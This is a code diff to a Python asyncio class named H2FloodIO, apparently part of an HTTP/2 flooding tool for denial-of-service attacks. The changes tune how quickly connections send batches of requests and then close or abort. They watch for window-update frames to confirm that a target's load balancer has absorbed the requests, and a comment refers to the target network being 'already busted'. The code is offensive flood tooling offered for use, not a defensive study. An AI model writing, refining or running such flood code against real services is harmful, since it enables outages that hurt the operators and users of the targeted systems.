@@ -1,4 +1,5 @@
 import asyncio
+from contextlib import suppress
 import errno
 import time
 from enum import Enum
@@ -17,6 +18,7 @@ import collections.abc
 setattr(collections, 'MutableSet', collections.abc.MutableSet)
 setattr(collections, 'MutableMapping', collections.abc.MutableMapping)
 import h2.connection
+from h2.events import WindowUpdated
 from h2.exceptions import NoAvailableStreamIDError, TooManyStreamsError
 
 
@@ -76,8 +78,9 @@ class H2FloodIO(asyncio.Protocol):
 
     _max_num_streams = 1024
     _recv_settings_timeout = 3.0
-    _abort_delay = 10.0
-    _
+    _close_delay = 1.0
+    _abort_delay = 3.0
+    _negotiate_reset = False
 
     def __init__(
         self,
@@ -137,50 +140,63 @@ class H2FloodIO(asyncio.Protocol):
                 break
         self._send()
         self._requests_sent = True
-        self._loop.call_soon(self._close)
-
-    def _cleanup_handle(self, handle_name: str):
-        handle = getatt(self, handle_name, None)
-        if handle is None:
-            return
-        if not handle.done():
-            handle.cancel()
-        setattr(self, handle_name, None)
 
     def _close(self):
-        self._conn.close_connection()
-        self._send()
+        if self._close_handle is None:
+            return
+        self._close_handle.cancel()
+        self._close_handle = None
+        if self._negotiate_reset:
+            self._conn.close_connection()
+            self._send()
         self._transport.close()
         self._abort_handle = self._loop.call_later(self._abort_delay, self._abort)
 
     def _abort(self):
-        if self._abort_handle is not None:
-            if not self._abort_handle.done():
+        if self._transport is None:
+            return
+        self._connections.remove(hash(self._transport))
+        with suppress(Exception):
+            if self._close_handle is not None:
+                self._close_handle.cancel()
+                self._close_handle = None
+            if self._abort_handle is not None:
                 self._abort_handle.cancel()
-            self._abort_handle = None
-        if self._recv_settings_timeout_handle is not None:
-            self._recv_settings_timeout_handle.cancel()
-            self._recv_settings_timeout_handle = None
-        if self._transport:
-            self._connections.remove(hash(self._transport))
-            self._transport.abort()
-            self._transport = None
+                self._abort_handle = None
+            if self._recv_settings_timeout_handle is not None:
+                self._recv_settings_timeout_handle.cancel()
+                self._recv_settings_timeout_handle = None
+        self._transport.abort()
+        self._transport = None
+
+    def _window_update_received(self, events) -> bool:
+        # received window update on non-settings stream confirmed that
+        # the load balancer finished consuming requests (typically all
+        # of them are going to arrive withing them same packet though
+        # it cannot be guaranteed, e.g. in case the target network is
+        # already busted)
+        return any(map(lambda e: isinstance(e, WindowUpdated), events))
 
     def data_received(self, data):
         # we rely here on the fact that frame settings has to
         # fit even tiniest sock read buffer
         if self._recv_settings_timeout_handle is not None:
-            self._recv_settings_tiemout_hanle.cancel()
+            self._recv_settings_timeout_handle.cancel()
             self._recv_settings_timeout_handle = None
-        _events = self._conn.receive_data(data)
-        if not self._recv:
-            self._transport.pause_reading()
+        events = self._conn.receive_data(data)
         self._send()
         if not self._requests_sent:
             self._loop.call_soon(self._send_requests)
+        elif events and self._window_update_received(events) and self._close_handle is None:
+            if not self._recv:
+                self._transport.pause_reading()
+            self._close_handle = self._loop.call_later(self._close_delay, self._close)
 
     def connection_lost(self, exc) -> None:
-        self._on_close.set_result(True)
+        if exc is None:
+            self._on_close.set_result(True)
+        else:
+            self._on_close.set_exception(exc)
         self._abort()
 
     def pause_writing(self) -> None:
@@ -194,8 +210,6 @@ class H2FloodIO(asyncio.Protocol):
     def _recv_settings_timeout_cb(self) -> None:
         self._recv_settings_timeout_handle = None
         if self._transport is None:
-            return
-        if self._requests_sent:
             return
         self._abort()
 
